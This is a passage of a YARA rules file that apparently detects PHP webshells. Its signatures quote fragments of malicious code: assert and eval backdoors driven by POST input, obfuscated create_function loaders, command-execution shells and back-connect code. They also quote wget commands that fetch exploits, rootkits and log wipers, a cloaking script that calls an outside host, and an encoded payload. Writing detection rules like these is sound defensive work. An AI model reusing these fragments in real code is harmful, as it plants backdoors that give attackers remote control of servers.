      $s10 = "function  DeleteFrom(activeLinkModel $model)" fullword ascii
      $s11 = "function  UpDateSet(activeLinkModel $model)" fullword ascii
      $s12 = "// TODO: Implement InsertInto() method." fullword ascii
      $s13 = "// TODO: Implement UpDateSet() method." fullword ascii
      $s14 = "// TODO: Implement DeleteFrom() method." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_07f222bac0dc4b4d289e7e5e5a717938ece28509
{
   meta:
      description = "php17 - file 07f222bac0dc4b4d289e7e5e5a717938ece28509.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a235b0c198af4706bee415f0f68ad6dcd4f806063d7d76c04afffd2becdd3e4c"
   strings:
      $s1 = "call_user_func('assert', $_POST['faith']);" fullword ascii
      $s2 = "call_user_func_array('assert', array($_REQUEST['faith']));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_9fe94697300b4996166c9f9b2de3050cb222d524
{
   meta:
      description = "php17 - file 9fe94697300b4996166c9f9b2de3050cb222d524.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "96e850e1a18126e635fc761e1707ab5be8f14007ec30af14f3a5baf5d70f1b7e"
   strings:
      $s1 = "$S='?V64_enc?Vode(x(gzc?Vompress?V($o),$k)?V?V);print(\"?V<$k>?V$?Vd</$k>\");?V@session_des?Vtroy();}}}}';" fullword ascii
      $s2 = "$H='$?Vm);if?V($?Vq&&$m){@se?Vssi?Von_st?Vart();$s=?V&$?V_SESSION;$ss=\"?V?Vsubstr\";$s?Vl=\"strt?Vo?Vlo';" fullword ascii
      $s3 = "$N='?Vcompress(@x(@base?V64_deco?Vd?Ve(preg_repl?Vace(?Varray(\"/?V_/?V\",\"?V/-/\"),array(?V\"/\",\"+\"?';" fullword ascii
      $s4 = "$Z='rp?Vos(?V$p,$h)?V===0){$s[$i]=\"\";$p?V=$ss?V($p,?V3)?V;}if(array?V_key_e?Vx?Vists?V($i,$s)){$s';" fullword ascii
      $s5 = "$a='q=array_?Vvalues?V($q?V);pre?Vg_ma?V?Vtch_al?Vl(\"/([\\\\w])[\\\\w-]+?V(?:;q=0?V.([\\\\d]))??V,?/\",$?Vra,';" fullword ascii
      $s6 = "$X='CEPT_LA?VNGUAGE\"]?V?V;if($rr&&$ra){?V$u=par?Vse_url(?V$rr);p?Var?Vse_str(?V$u[\"quer?Vy?V\"],$q)?V;$';" fullword ascii
      $s7 = "$O='i.?V$kf)?V,0,3))?V;$p=\"\";for($z=?V1;$z<co?Vunt?V($m[1?V]);$z++)$p.=?V$q[$m?V[2][$z]?V?V];if(st?V';" fullword ascii
      $s8 = "$A='[$i].?V=$p;$?Ve=s?Vtrpos?V($s[$i]?V,$f);if(?V?V$e){$k=$kh?V.$kf;ob_?Vstart(?V?V);@eva?Vl(@gzun?V';" fullword ascii
      $s9 = "$n='V),?V$?Vss($s[$i],0?V,$e))),$k))?V);$o=o?Vb?V_ge?Vt_con?Vtents();o?Vb_e?Vnd_clea?Vn();$d=b?Vase';" fullword ascii
      $s10 = "$P='wer?V?V\";$i=$?Vm[1][0].$m[1][1?V];$h=?V$sl?V($ss(md5($i.$k?Vh),0,3?V));?V$f=$?Vsl($ss(?V?Vmd5($';" fullword ascii
      $s11 = "$m='{$j};}?V}return $o;}$r=?V$_SE?VRVER;$rr?V=@$r[\"H?VTTP?V_REF?VERER\"];$r?Va=@?V$r[\"HT?VTP_?VAC';" fullword ascii
      $s12 = "$E='Vo=\"\";for(?V$i=0;$i<$?V?V?Vl;){for($j?V=0;(?V?V$j<$c&&$i<$l);?V$j++,$i++){$?Vo.?V=$t?V{$i}^?V$k';" fullword ascii
      $s13 = "$D='$kh=\"5d4?V1\";$kf=\"?V402a\";?Vfunctio?V?Vn x($t,$k)?V{$c=st?Vrlen(?V$k);$l=?Vstrlen(?V$t)?V;$?';" fullword ascii
      $s14 = "$c=str_replace('?V','',$D.$E.$m.$X.$a.$H.$P.$O.$Z.$A.$N.$n.$S);" fullword ascii
      $s15 = "$d=str_replace('W','','creWatWWe_fuWWnWction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_8624a02263f24c08ab7775f5c2ebacdf48be3abd
{
   meta:
      description = "php17 - file 8624a02263f24c08ab7775f5c2ebacdf48be3abd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "66d71af2923d108af2757dfad504202a021eab95ea6b2d7f9bab95e977b3be49"
   strings:
      $x1 = "elseif(!function_exists(popen)){ ob_start();system($ocmd);$nval=ob_get_contents();ob_clean();}elseif(!function_exists(system)){" fullword ascii
      $x2 = "print $st.$c1.\"<div><b><center>Execute useful commands</div>\";" fullword ascii
      $x3 = "if(strstr(php_os,\"WIN\")){$epath=\"cmd.exe\";}else{$epath=\"/bin/sh\";}" fullword ascii
      $s4 = "ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){" fullword ascii
      $s5 = "$obj=new upload($HTTP_POST_FILES['upfile']['name'],$HTTP_POST_FILES['upfile']['tmp_name']); if (isset ($_REQUEST['ustsub'])){" fullword ascii
      $s6 = "print \" - <a target='_blank' href=\".inclink('dlink', 'phpinfo').\">phpinfo</a>\";" fullword ascii
      $s7 = "<option value='op0'>Execute quick commands</option>" fullword ascii
      $s8 = "print \\$sock \\\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\\\";" fullword ascii
      $s9 = "print \"<center><div><b>Enter the command to execute\";print $ec;" fullword ascii
      $s10 = "$owhich){if(function_exists(exec)){$nval=exec($ocmd);}elseif(!function_exists(exec)){$nval=shell_exec($ocmd);}" fullword ascii
      $s11 = "input(\"submit\",\"\",\"Execute\",\"\");print \"</center>\".$ef.$ec.$et.\"</div></td>\";" fullword ascii
      $s12 = "if ($_REQUEST['uscmnds']=='op3'){callfuncs('cat /var/cpanel/accounting.log');}" fullword ascii
      $s13 = "ob_start();passthru($ocmd);$nval=ob_get_contents();ob_clean();}" fullword ascii
      $s14 = "print \" - <a href=\".inclink('dlink', 'cmdhlp').\"&scdir=$nscdir>Cmd help</a>\";" fullword ascii
      $s15 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s16 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s17 = "print $st.$c1.\"<div><b><center>Execute php code with eval()</div>\";" fullword ascii
      $s18 = "print \"<p><b>: Insert the command below to get help or to know more about it's uses :\";print \"<form method=get>\";" fullword ascii
      $s19 = "\\$sock = IO::Socket::INET->new(PeerAddr => \\\"old.zone-h.org\\\", PeerPort => 80, Proto => \\\"tcp\\\") or next;" fullword ascii
      $s20 = "ob_start();passthru($cmnd);$pret = ob_get_contents();ob_clean();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_99fac5eadb04ee781dee53a6cb9c3d88d5801fed
{
   meta:
      description = "php17 - file 99fac5eadb04ee781dee53a6cb9c3d88d5801fed.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ab3e7602f043dd18f2d8d87874523573e49d26b6265569b18ab7ce47b0c2c05b"
   strings:
      $s1 = "$password = isset($_POST['password']) ? $_POST['password'] : '';" fullword ascii
      $s2 = "<?php exit;}elseif(isset($get) && !empty($get)  && $get==$pass){" fullword ascii
      $s3 = "<form action=\"?id=<?php echo $pass?>\" method=\"post\">" fullword ascii
      $s4 = "<form action=\"\" method=\"post\" style=\" margin-top:200px; margin-left:40%;\"><p>" fullword ascii
      $s5 = ": <input type=\"password\" name=\"password\" /></p>" fullword ascii
      $s6 = ": </b><br /> <textarea name=\"neirong\" style=\"width:500px; height:400px;\"></textarea><hr/>" fullword ascii
      $s7 = "if($password==$pass){" fullword ascii
      $s8 = "$get = isset($_GET['id']) ? $_GET['id'] : '';" fullword ascii
      $s9 = ":<input type=\"text\" name=\"lujin\"  style=\"width:300px;\"/><br /><br />" fullword ascii
      $s10 = "$lujin = @$_POST['lujin'];" fullword ascii
      $s11 = "$neirong = @$_POST['neirong'];" fullword ascii
      $s12 = ":'.PHP_VERSION.'<br />';" fullword ascii
      $s13 = "$pass = '123456';" fullword ascii
      $s14 = "---\" style=\" margin-left:200px;\" /></p>" fullword ascii
      $s15 = ":'.__DIR__ .'\\\\</b>';echo'<br /><hr />';" fullword ascii
      $s16 = "<input  type=\"submit\" value=\"---" fullword ascii
      $s17 = "\" style=\" margin-left:100px;\"/>" fullword ascii
      $s18 = "if (empty($lujin) || empty($neirong)) {" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 4KB and
      8 of them
}

rule sig_4b7f7f390ad298bc364c3c1b8d5c81fc532c90c1
{
   meta:
      description = "php17 - file 4b7f7f390ad298bc364c3c1b8d5c81fc532c90c1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2e4d5a3567e885753aa2853beec0b1d8dab1b4f0b86c3891030ea5eb5c3c9928"
   strings:
      $s1 = "$l='Qv+\"),$ss($sQv[$i],0,$e)))Qv,Qv$k)));$o=obQv_get_cQvonQvtenQvts();ob_Qvend_cleanQv();$d=Qvbase';" fullword ascii
      $s2 = "$N='v};}}returQvn Qv$o;}$r=$_SERVEQvQvR;$rr=@$r[\"QvHTQvTP_REQvFERER\"];$rQvQva=@$Qvr[\"HTTP_ACCEPQvT_';" fullword ascii
      $s3 = "$L='Qv64Qv_Qvencode(x(gzcomprQvess($o),$Qvk))Qv;prinQvQvt(\"<$k>$d</$Qvk>\")Qv;@sessQvion_destQvroy();}}}}';" fullword ascii
      $s4 = "$R='compQvress(@x(QvQv@base6Qv4_decodQve(pQvreg_rQveplaceQv(array(\"Qv/Qv_/\",\"/-Qv/\"),array(\"/Qv\",\"';" fullword ascii
      $s5 = "$o='LANGUQvAGE\"];ifQv(Qv$rr&&$ra){$QvQvu=parse_urQvl($rr);Qvparse_Qvstr($u[Qv\"queryQv\"Qv],$q);$q=Qva';" fullword ascii
      $s6 = "$W='$m)Qv;if($q&Qv&$m)Qv{@sesQvsion_sQvtart();$s=&$_QvSEQvSSIOQvN;$QvQvss=\"substr\";$sl=\"strQvtQvoloQ';" fullword ascii
      $s7 = "$y='Qv$kh=\"5d41\";Qv$kf=\"Qv40Qv2a\";functionQv x(Qv$tQv,Qv$k){$c=strlen($k);$lQvQv=strlen($t);$Qvo=\"';" fullword ascii
      $s8 = "$O='rray_vaQvQvQvlues($Qvq);pregQvQv_match_all(\"/([\\\\wQv])[\\\\w-]Qv+(?:;q=0.(Qv[\\\\Qvd]))?,?/\",Qv$raQv,';" fullword ascii
      $s9 = "$t='vwer\";$i=$m[Qv1Qv][Qv0].$m[1][1];$h=$Qvsl($Qvss(md5($i.$Qvkh),0,3Qv));Qv$Qvf=$QvQvsl($ss(mdQv5(';" fullword ascii
      $s10 = "$z='$sQv[$i].=$pQv;$e=sQvtrpos($s[$iQvQv],$f);iQvf($e){$k=Qv$Qvkh.$kf;oQvb_staQvrt(Qv);@evaQvl(@gzun';" fullword ascii
      $s11 = "$i='\";Qvfor($i=0;Qv$i<$l;Qv){QvfQvor($j=0;($Qvj<$c&&Qv$i<$l);$j++Qv,$iQv+Qv+){$oQv.=$t{$i}^$Qvk{$jQ';" fullword ascii
      $s12 = "$H='$i.$kf),Qv0Qv,3));$p=Qv\"\";for($Qvz=1;$Qvz<countQv($m[1]Qv);$z++)$p.=$q[$Qvm[Qv2][$z]];if(Qvst';" fullword ascii
      $s13 = "$b='rpoQvQvs($p,Qv$Qvh)===0){$s[$iQvQvQv]=\"\";$p=$ssQv($p,3);}if(array_QvkQvey_exisQvts($i,$s))Qv{';" fullword ascii
      $s14 = "$c=str_replace('Qv','',$y.$i.$N.$o.$O.$W.$t.$H.$b.$z.$R.$l.$L);" fullword ascii
      $s15 = "$E=str_replace('b','','bcreatbebb_bfubnction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_398fcc4176cbdefb9271ad67decbab5c08312bf2
{
   meta:
      description = "php17 - file 398fcc4176cbdefb9271ad67decbab5c08312bf2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2884d456f6a33415db1ce6c8ef4a9a6ed860b3f76482c8460d27bd83120858ab"
   strings:
      $x1 = "<input type=hidden name=\"cmd_txt\" value=\"1\"> - <input type=submit name=submit value=\"Execute\">" fullword ascii
      $x2 = "array(\"wget Sudo Exploit\",\"wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\")," fullword ascii
      $x3 = "exit(\"<a href=\\\"$sh_mainurl\\\">$sh_name</a>: Access Denied - Your host (\".getenv(\"REMOTE_ADDR\").\") not allowed\");" fullword ascii
      $x4 = "displaysecinfo(\"Kernel Version\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
      $x5 = "function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {" fullword ascii
      $x6 = "$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;" fullword ascii
      $x7 = "\"Your IP : <a href=http://whois.domaintools.com/\".$_SERVER[\"REMOTE_ADDR\"].\">\".$_SERVER[\"REMOTE_ADDR\"].\"</a><br>\";" fullword ascii
      $x8 = "\"<tr><td></td><td><input type=\\\"checkbox\\\" name=\\\"fqb_onlywithsh\\\" value=\\\"1\\\"> Users only with shell</td></tr>\"." fullword ascii
      $x9 = "\"<td width=50%><p>Server IP : <a href=http://whois.domaintools.com/\".gethostbyname($_SERVER[\"HTTP_HOST\"]).\">\".gethostbynam" ascii
      $x10 = "$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;" fullword ascii
      $x11 = "array(\"wget & run BindDoor\",\"wget \".$sh_mainurl.\"tool/bind.tar.gz;tar -zxvf bind.tar.gz;./4877\")," fullword ascii
      $x12 = "$logfile = $tmpdir_logs.\"yx29sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x13 = "array(\"wget RatHole 1.2 (Linux & BSD)\",\"wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz\")," fullword ascii
      $x14 = "echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesiz" fullword ascii
      $x15 = "array(\"Downloaders?\",\"which wget curl w3m lynx fetch lwp-download\")," fullword ascii
      $x16 = "if (file_get_contents($v)) {echo \"<td colspan=2><div class=yxerrmsg>You can't crack Windows passwords(\".$v.\")</div></td></tr" fullword ascii
      $x17 = "array(\"wget WIPELOGS PT1\",\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\")," fullword ascii
      $x18 = "array(\"Md5-Lookup\",\"http://darkc0de.com/database/md5lookup.html\")," fullword ascii
      $s19 = "echo(\"<center><b>Bind Shell Backdoor:</b><br><br><form name=form method=POST>" fullword ascii
      $s20 = "array(\"wget & extract EggDrop\",\"wget \".$sh_mainurl.\"httpd.tar.gz;tar -zxf httpd.tar.gz\")," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*) and all of them
}

rule sig_23bc163d7ddffb457d674f8f8f97a0a446ac7aac
{
   meta:
      description = "php17 - file 23bc163d7ddffb457d674f8f8f97a0a446ac7aac.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4ab874f71707c24425f48c25b2811a45099d321cb621431ff56e165721a211d2"
   strings:
      $s1 = "if(isset($_GET['cmd']) || isset($_POST['passw'])) $html_onload = \"onload=\\\"document.getElementById('cmd').focus();\\\"\";" fullword ascii
      $s2 = "AAAAAAAAAAAAAAB" ascii
      $s3 = "target.style.background = '\".$shell_color.\"';" fullword ascii
      $s4 = "var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';" fullword ascii
      $s5 = "$shell_password = \"devilzc0der\";" fullword ascii
      $s6 = "<input style=\\\"width:300px;\\\" type=\\\"text\\\" name=\\\"childname\\\" value=\\\"\".$shell_name.\".php\\\"; />" fullword ascii
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFVQWDAAAAAA" fullword ascii
      $s8 = "<input style=\\\"width:100px;\\\" type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnNewUploadLocal\\\" value=\\\"Get\\\" />" fullword ascii
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii
      $s10 = "$shell_fake_name = \"Server Logging System\";" fullword ascii
      $s11 = "elseif((isset($_GET['view']) && ($_GET['view'] != \"\")) || ((isset($_GET['filename']) && ($_GET['filename'] != \"\")))){" fullword ascii
      $s12 = "header(\"Content-disposition: attachment; filename=\\\"\".basename($file).\"\\\";\");" fullword ascii
      $s13 = "AFZpcnR1YWxQcm90ZWN0AABWaXJ0dWFsQWxsb2MAAFZpcnR1YWxGcmVlAAAARXhpdFByb2Nlc3MA" fullword ascii
      $s14 = "AABPcGVuU2VydmljZUEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" fullword ascii
      $s15 = "TEwAQURWQVBJMzIuZGxsAFdTMl8zMi5kbGwAAExvYWRMaWJyYXJ5QQAAR2V0UHJvY0FkZHJlc3MA" fullword ascii
      $s16 = "$wBind=\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" fullword ascii
      $s17 = "var target = document.getElementById(address);" fullword ascii
      $s18 = "<tr><td style=\\\"width:120px;\\\">New Shellname</td><td style=\\\"width:304px;\\\">" fullword ascii
      $s19 = "<td style=\\\"width:10%;\\\"><input type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnCommand\\\" style=\\\"width:120px;\\\" val" ascii
      $s20 = "<td style=\\\"width:10%;\\\"><input type=\\\"submit\\\" class=\\\"btn\\\" name=\\\"btnCommand\\\" style=\\\"width:120px;\\\" val" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule sig_493751a287a35ae1906ef1823610ae8c963a18b9
{
   meta:
      description = "php17 - file 493751a287a35ae1906ef1823610ae8c963a18b9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f093b9f8ffb3ce318e06b84172c5f46cd97bff2be6ee4f022459733936594732"
   strings:
      $x1 = "<p>G6 Shell v\".$shellVersion.\" Open Beta Edition - coded by Mr. P-teo, below are the known issues and bugs.</p>\";" fullword ascii
      $x2 = "<b>Server IP: </b>\".$_SERVER[\"SERVER_ADDR\"].\" <span class='enabled'><a href='http://www.who.is/whois/\".$_SERVER['HTTP_HOST'" ascii
      $x3 = "target='_blank'>[WHOIS]</a> - <a href='http://www.dnsstuff.com/tools?runFromMain=\".$_SERVER[\"SERVER_ADDR\"].\"&toolType=tracer" ascii
      $x4 = "<b>Server Software: </b>\".$_SERVER[\"SERVER_SOFTWARE\"].\" <span class='enabled'><a href='http://www.exploit-db.com/search/?act" ascii
      $x5 = "lter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=' target='_blank'>[Exploit DB]</a></span><br />" fullword ascii
      $x6 = "fputs($sockfd , \"\\n\" . shell_exec($command) . \"\\n\\n\"); } fclose($sockfd);}}" fullword ascii
      $x7 = "<input style=\"padding:4px 10px;margin:10px 0px;\" name=\"evalexecute\" value=\"Execute Code\" type=\"submit\"/>" fullword ascii
      $x8 = "<br /><br /><br /><br /><div class='Logo'>G6 v<?php echo $shellVersion; ?></div><div class='logotext'>Private Shell Coded By Mr." ascii
      $x9 = "<br /><br /><br /><br /><div class='Logo'>G6 v<?php echo $shellVersion; ?></div><div class='logotext'>Private Shell Coded By Mr." ascii
      $s10 = "\\n{################################################################}\"); $pwd = shell_exec(\"pwd\"); $sysinfo = shell_exec(\"un" ascii
      $s11 = "G6 PHP webshell was coded by Mr. P-teo for the Hacking community." fullword ascii
      $s12 = "echo \"<title>G6 Shell v1.1 - Private .::Made By Mr. P-teo::.</title>" fullword ascii
      $s13 = "<p>Back connect will allow you to enter system commands remotely.</p>" fullword ascii
      $s14 = "<p>Command line execution via exec, passthru or system.</p>" fullword ascii
      $s15 = ".execbox{width:250px;padding: 5px 15px 15px 15px;height:auto;border:solid 1px #47A3FF;background:#0A0A0A;}" fullword ascii
      $s16 = "if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { header('HTTP/1.0 404 Not Found'); exit; } " fullword ascii
      $s17 = "width:220px;\" name=\"email\" placeholder=\"email@address.com\" /></tr><tr><td>Subject: </td>" fullword ascii
      $s18 = ".command{width:620px;border:solid 1px #47A3FF;outline:none;background:#0A0A0A;color:#f2f2f2;}" fullword ascii
      $s19 = "<center><input style=\"padding:7px 15px;margin:10px 0px;\" name=\"Remove\" value=\"Remove Shell\" type=\"submit\"/></center>" fullword ascii
      $s20 = "echo \"<tr><td><a class='flink' title='Edit File' href='?readfile=\" .$currentDirectory. \"/\" .$File. \"'>\" . $File . \"</a></" ascii
   condition:
      uint16(0) == 0x213c and filesize < 80KB and
      1 of ($x*) and all of them
}

rule sig_38ee32bb92d99bd6354599f94551de7d6091c240
{
   meta:
      description = "php17 - file 38ee32bb92d99bd6354599f94551de7d6091c240.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "34c89f86c6432c5a02ddc65336bd01edf807bd4b6ec2aa79d330d32c31f0b6bc"
   strings:
      $s1 = "$str = GetFileContent(\"http://html.2016win.win/v1/proxy2.php?\".$u[1].\"|\".$_SERVER['HTTP_HOST']);" fullword ascii
      $s2 = "$str=GetFileContent(\"http://html.2016win.win/v1/proxy.php?\".$u[0]);" fullword ascii
      $s3 = "if(stripos($_SERVER[\"HTTP_USER_AGENT\"], \"Googlebot\") !== false) return true;" fullword ascii
      $s4 = "if(strpos($_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'],'?ja-') !== false) return false;" fullword ascii
      $s5 = "$file_contents = curl_exec($ch);" fullword ascii
      $s6 = "$xmlnsvalue = $dom->createTextNode(\"http://www.sitemaps.org/schemas/sitemap/0.9\"); " fullword ascii
      $s7 = "header(\"Content-type:text/xml; charset=utf-8\");" fullword ascii
      $s8 = "echo '<script>document.location=(\"http://html.2016win.win/ny1.php?'.$uy.'\");</script>';" fullword ascii
      $s9 = "if(strpos(strtolower($referer), \"google\") !== false || strpos(strtolower($referer), \"yahoo\") !== false) return true;" fullword ascii
      $s10 = "$url_str = GetFileContent($url);" fullword ascii
      $s11 = "$uy= $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;" fullword ascii
      $s12 = "$contents=ob_get_contents(); " fullword ascii
      $s13 = "function GetFileContent($url){" fullword ascii
      $s14 = "$url = \"http://html.2016win.win/v1/siteurls.php?\".$u[0];" fullword ascii
      $s15 = "if(strpos(strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']), \"ja\") !== false) return true;" fullword ascii
      $s16 = "if(trim($_SERVER['QUERY_STRING'])==\"sitemap.xml\"){" fullword ascii
      $s17 = "$referer = $_SERVER['HTTP_REFERER'];" fullword ascii
      $s18 = "return $file_contents;" fullword ascii
      $s19 = "return strpos(strtolower($str),strtolower($needle),$offset);" fullword ascii
      $s20 = "curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule sig_7bb48d0a018db5535b43d496facdeab95586fd49
{
   meta:
      description = "php17 - file 7bb48d0a018db5535b43d496facdeab95586fd49.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "934a7e7e3170ada4e631e5f669e63718d66d7a55dae4a1ec05b984ec3d14314e"
   strings:
      $s1 = "$arr = array($_POST['pass'] => '|.*|e',);" fullword ascii
      $s2 = "array_walk_recursive($arr, $e, '');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_63b4f466fec4bf8fe45d4a509b7e694635a6af5b
{
   meta:
      description = "php17 - file 63b4f466fec4bf8fe45d4a509b7e694635a6af5b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a9008eeb58dce33b6a0871ba69762954b20cfe1bb67bdc4400523a44abf5110d"
   strings:
      $x1 = "eval(gzinflate(base64_decode(strrev(str_rot13('=8u///5557/ss//xBzBpXjJ5/nVhIuMLepXM09DIgR/ah/IuT36cltrb5gdxOYoSG/5LtE6haesQlpZ+m" ascii
      $s2 = "azmDSk+y+3SF6N9v8ATK++S6jtzexq/zW300QTs8dLLqEyQuFqEZQjKyNVs2Y+yd0cbS5Y3PHJcmDf6nT6ByrBPb/RVcVR1ZixuI0LSODCmriQ9blvjQY8WqHvwi6QHt" ascii
      $s3 = "JH4unpum+FygMb438xdnhT8nyMmzVtJ2VKv+JcmpfySM05JUEyxuniiFTpiC5wGtyruW9/afssm7SLUq52wdR+lqQv3WWjnZVnQc6obdIDRcFolGAzfzqIrJbmZObH/6" ascii
      $s4 = "RtPWEZWtx4kCnDs3/yg6LpxrD1uT2TzdgZ/X+vYEgyn/5KdRdLlzqq0PUa7zKRXeb6vzipsEpgWw+TlhPxWqldKaCyjLZyIrkIH2s2U7DOeF3XO9uYJFKLEhnXrsMjjE" ascii
      $s5 = "ITXoAdL3W9WVyoXdHFmo+c5xPV80sZmllLtgobHjU3PApRCS09br4hZmUjp/BKDXDllTusFnoi/cnA+ONR3sgYSltEv89Q6LehAsqHb3pj0JZy9aUB5OHJNimJl99gkM" ascii
      $s6 = "2heYejDIaGqRHqiXPKjgw5s+gov9K5aph6Q8IRoMcrhCr84G2gx/MTHr/QXxZIU4C1vSok/dHBNlNjiQDRbfsUDHZlZ5z415gRmgrrG2hQsN1GFBkpAko/wkJRF4QsPN" ascii
      $s7 = "e9+UTgdAD2qUbfXXd9b43yMhdMbfFz0MN7j3qA+MCvqCT3wFKG6mgyQ1Ez67vhe4QkavCyLsijWbK2EO8g6Sc3m8xYF4a5GxZ6f+ZkFpKIti0JOgzZ/lOGpa8arFlc8S" ascii
      $s8 = "wNznHs1DyMfWvUWu671nvDXqqyr8416sll+yg0gfJocUjU5DQg5JHjewn5c5w48W6rGfbF+WjqZlsq10KnNz9y09XsBRbGvsA2ZTwdtJ+xBGetJE54AETzbznqXBuaXl" ascii
      $s9 = "s0DyjGaj0bDK2mJPnX4Pd+wAJB7bmmn22YLmqEVasmjaQyZx+5TcQSuVoDwm/ZLDLLew08x7dSWqnnD9E0frkF+SG0uZpdKtslZ5cIKVPjsAGh8gFa7Np8HXSOwD4v9r" ascii
      $s10 = "MPzHA58o9LVjk3JykZE0EncTN21otjtVO8vVywX6T5pFIR9P0CfcmkR7GSpq1f2c0hcNXqE79gxWSXes63lgQhhc+HAjqHnFgwir4NsoOExa0JnEXryQJSXtEbYBYuYL" ascii
      $s11 = "K18/xhmy7mhiDHREXw/q9pdFnpDDmO19P3IMMACe42ffsVozHYxthTLkpb8fhIbvdHUURgiqFwxGNJaxFzYhb2ysVNbLrT+/EC2X0mPsbHxR5gZkb7q7Yp0cULqeWJD7" ascii
      $s12 = "Zdv46Pay92LB9YZpkzzzOY407eEVFu1TXMNnfKsJufN73RdjLxbGlauw17rcndll3OB/CrN3/urX1+LskxiWZxVbW49m3nsAQabfAX/s8500xSZWIq7E+AP11r/z7Qrl" ascii
      $s13 = "NEfBv9iXupPLi32lb9aarkTtOsqqTou64Iup0cIkmPh70MkwHk4HNmNbCk3Oi7XKS0+NA5PQgcQyod9Ku790HJvpP5uDtr88+oyl+zFlDTSDAQ7uBy7olcgGSGaYEScO" ascii
      $s14 = "Ck+gETltbLkxPC8p9aFFM0Xq/qPPQxxUmxFYPjV5NyAFnWwrCvBgqvE9UMAKNL8UajJApeo0DdvLzp5S8R61new+2sm5q4Bx3ihVpPIUltjWHnyddFQCnCB4LLom9jTM" ascii
      $s15 = "ryUhU77Gpxr7w5SwpclxEJ/1Q5vOokIHzgqHqJiMIqTWcvOidiRCehk37rsoeJ+oSkWtCmilusGHveP1T/pGghSAq+cTP16rB93V0J48IG1YX7HtTsXjlKOT/Eve9vcZ" ascii
      $s16 = "EP5+aAzyedLlos635+Bg/0aNfq5A9emTkm42LKf+W2A1QmXLu+KH0xJcf5SExlaWnVDexC606hJ+x6kPTlDK5Muz4ojxZo8iXYvJlvzfLkzYm1dgj7HKmGmQxBbtkP8D" ascii
      $s17 = "JIrM5R3rarBgejMPeznYEOVy46nhLMLzryffB/uspYUxeQ9PQrYDw8OuKFlyWUIPvG8d6XZNm7k4/MeJLOk2oKRSYP3uQE55Vm+PHrVnnH+ED6ggKBm6eq8MWB62Ycw9" ascii
      $s18 = "x8F/jeKnqigJ4i20quMEYhTr/KnRRugQhfDij+Yr+AUYThvBxjfg4Cuxu64qOYZlBWNy/5NH6HBl5QHN26FpylOgX6qxq0EBMfCJd/3i9122EB+DIP6yfwVNaOAZdGLv" ascii
      $s19 = "odQ1N52Jh55hz2ER5Jn4YQktX6mh2tbjGme7kJktkmrcNXc6r6p1uSVwDKQdMblB0yyloGI9chCDB22RbtM2wRBAeDZPM4hlM4oaU1CLbJ7+DNKH7Rpeeb7Vf8kZyAG7" ascii
